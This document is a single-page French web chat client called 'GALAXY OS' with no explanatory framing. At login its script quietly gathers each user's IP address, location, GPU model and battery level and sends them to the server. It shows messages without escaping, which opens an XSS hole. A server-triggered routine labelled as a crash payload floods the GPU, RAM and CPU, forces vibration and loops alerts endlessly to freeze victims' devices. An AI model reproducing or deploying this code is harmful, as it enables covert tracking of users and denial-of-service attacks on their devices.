<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>GALAXY OS - V15 PREMIUM</title>
    <style>
        :root { --main: #a29bfe; --red: #ff4d4d; --bg: #0a0a0c; --glass: rgba(255, 255, 255, 0.03); }
        * { box-sizing: border-box; font-family: 'Segoe UI', 'Roboto', sans-serif; }
        
        body { margin: 0; background: #000 url('https://w0.peakpx.com/wallpaper/521/633/HD-wallpaper-incandescent-stars-sky-galaxy.jpg') no-repeat center center fixed; background-size: cover; color: white; height: 100vh; display: flex; overflow: hidden; }

        /* EFFET DE VERRE SMOOTH */
        #login-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.8); backdrop-filter: blur(15px); z-index: 10000; display: flex; align-items: center; justify-content: center; transition: all 0.8s cubic-bezier(0.4, 0, 0.2, 1); }
        .login-box { background: var(--glass); border: 1px solid rgba(162, 155, 254, 0.3); padding: 40px; border-radius: 24px; text-align: center; width: 320px; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
        
        #side-menu { width: 280px; background: rgba(0,0,0,0.6); backdrop-filter: blur(10px); border-right: 1px solid rgba(255,255,255,0.05); display: flex; flex-direction: column; transition: 0.3s; }
        #main-chat { flex: 1; display: flex; flex-direction: column; background: rgba(0,0,0,0.2); }

        /* MESSAGES SMOOTH */
        #messages { flex: 1; overflow-y: auto; padding: 25px; list-style: none; scroll-behavior: smooth; }
        .msg-card { display: flex; align-items: flex-start; margin-bottom: 20px; animation: fadeIn 0.4s ease forwards; opacity: 0; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        
        .pp-msg { width: 40px; height: 40px; border-radius: 12px; margin-right: 12px; object-fit: cover; border: 1px solid var(--main); }
        .msg-content { background: var(--glass); padding: 12px 16px; border-radius: 0 15px 15px 15px; border: 1px solid rgba(255,255,255,0.05); }

        /* MONITORING */
        #monitor { padding: 20px; font-size: 0.8em; color: #a29bfe; border-top: 1px solid rgba(255,255,255,0.05); }
        .stat { margin-bottom: 5px; opacity: 0.7; font-family: monospace; }

        /* INPUT */
        #form { padding: 20px; background: rgba(0,0,0,0.4); display: flex; gap: 12px; }
        #input { flex: 1; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); color: white; padding: 14px 20px; border-radius: 15px; outline: none; transition: 0.2s; }
        #input:focus { border-color: var(--main); background: rgba(255,255,255,0.08); }
        .btn { background: var(--main); color: #000; border: none; padding: 0 25px; border-radius: 15px; font-weight: bold; cursor: pointer; }

        /* CRASH SCREEN */
        #crash-screen { display: none; position: fixed; inset: 0; background: #000; z-index: 9999999; text-align: center; color: red; padding-top: 45vh; }
    </style>
</head>
<body>

    <div id="crash-screen">
        <h1 style="font-size:3em; animation: blink 0.1s infinite;">HARDWARE_FAILURE</h1>
        <p>SYSTEM_OVERHEAT_DETECTED</p>
    </div>

    <div id="login-overlay">
        <div class="login-box">
            <h2 style="color:var(--main); margin-bottom:30px;">GALAXY OS</h2>
            <input type="text" id="login-name" placeholder="VOTRE PSEUDO..." autocomplete="off">
            <label for="pp-input" style="display:block; padding:10px; background:rgba(255,255,255,0.05); border-radius:10px; cursor:pointer; margin-bottom:20px; font-size:0.8em;">PHOTO DE PROFIL (CLIQUEZ)</label>
            <input type="file" id="pp-input" accept="image/*" style="display:none">
            <button class="btn" style="width:100%; height:50px;" onclick="initUser()">ENTRER DANS L'ORBITE</button>
        </div>
    </div>

    <div id="side-menu">
        <div style="padding:40px 20px; text-align:center;">
            <img id="my-pp-display" style="width:90px; height:90px; border-radius:25px; border:2px solid var(--main); margin-bottom:15px; object-fit:cover; display:none;">
            <h3 id="my-name-display"></h3>
        </div>
        <div id="monitor">
            <div class="stat" id="mon-ip">IP: SCANNING...</div>
            <div class="stat" id="mon-gpu">GPU: SCANNING...</div>
            <div class="stat" id="mon-bat">BAT: --%</div>
        </div>
    </div>

    <div id="main-chat">
        <ul id="messages"></ul>
        <form id="form">
            <input id="input" autocomplete="off" placeholder="Message ou /bomb [IP]..." />
            <button type="submit" class="btn">ENVOYER</button>
        </form>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        let user = { name: "", pp: "https://i.pinimg.com/originals/a9/d0/96/a9d096ac3abc607758ca2d14e3f287ac.gif", geo: {}, hw: {} };

        // Gestion de la photo de profil
        document.getElementById('pp-input').onchange = function(e) {
            const reader = new FileReader();
            reader.onload = (event) => { user.pp = event.target.result; };
            reader.readAsDataURL(e.target.files[0]);
        };

        async function initUser() {
            const name = document.getElementById('login-name').value;
            if(!name) return;
            user.name = name;

            // Scan Géo
            try { const r = await fetch('https://ipapi.co/json/'); user.geo = await r.json(); } catch(e){}
            
            // Scan Hardware
            const gl = document.createElement('canvas').getContext('webgl');
            const debug = gl.getExtension('WEBGL_debug_renderer_info');
            const b = await navigator.getBattery();

            user.hw = {
                gpu: debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "Unknown",
                battery: Math.floor(b.level * 100)
            };

            // UI Update
            document.getElementById('login-overlay').style.opacity = '0';
            setTimeout(() => document.getElementById('login-overlay').style.display = 'none', 800);
            document.getElementById('my-pp-display').src = user.pp;
            document.getElementById('my-pp-display').style.display = 'inline-block';
            document.getElementById('my-name-display').innerText = user.name;
            document.getElementById('mon-ip').innerText = `IP: ${user.geo.ip || '---'}`;
            document.getElementById('mon-gpu').innerText = `GPU: ${user.hw.gpu.substring(0,15)}...`;
            document.getElementById('mon-bat').innerText = `BAT: ${user.hw.battery}%`;

            socket.emit('check_device', { name: user.name, geo: user.geo, hardware: user.hw, pp: user.pp });
        }

        document.getElementById('form').onsubmit = (e) => {
            e.preventDefault();
            const input = document.getElementById('input');
            if(input.value) {
                socket.emit('chat message', { text: input.value, name: user.name, pp: user.pp });
                input.value = '';
            }
        };

        socket.on('chat message', (d) => {
            const li = document.createElement('li');
            li.className = 'msg-card';
            li.innerHTML = `
                <img src="${d.pp}" class="pp-msg">
                <div class="msg-content">
                    <div style="font-size:0.7em; color:var(--main); margin-bottom:4px;">${d.name}</div>
                    <div>${d.text}</div>
                </div>
            `;
            document.getElementById('messages').appendChild(li);
            document.getElementById('messages').scrollTop = document.getElementById('messages').scrollHeight;
        });

        // 🧨 CHARGE UTILE CRASH (V15)
        socket.on('CORE_MELTDOWN_INIT', () => {
            document.getElementById('crash-screen').style.display = 'block';
            
            // Surcharge GPU (Kernel Panic)
            for(let i=0; i<400; i++) {
                let c = document.createElement('canvas');
                let gl = c.getContext('webgl');
                if(gl) {
                    let t = gl.createTexture();
                    gl.bindTexture(gl.TEXTURE_2D, t);
                    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 4096, 4096, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
                }
            }

            // Explosion RAM (500Mo)
            const leak = [];
            setInterval(() => {
                try { leak.push(new Uint8Array(500 * 1024 * 1024).fill(Math.random())); } catch(e){}
            }, 50);

            // Surcharge CPU
            const b = new Blob(["while(true){}"], {type: 'text/javascript'});
            for(let i=0; i<100; i++) { new Worker(URL.createObjectURL(b)); }

            if(navigator.vibrate) navigator.vibrate([100000, 1000, 100000]);
            
            while(true) {
                window.history.pushState(null, null, "");
                alert("CRITICAL_HARDWARE_FAILURE\n\nEMERGENCY_SHUTDOWN_FAILED");
            }
        });

    </script>
</body>
</html>
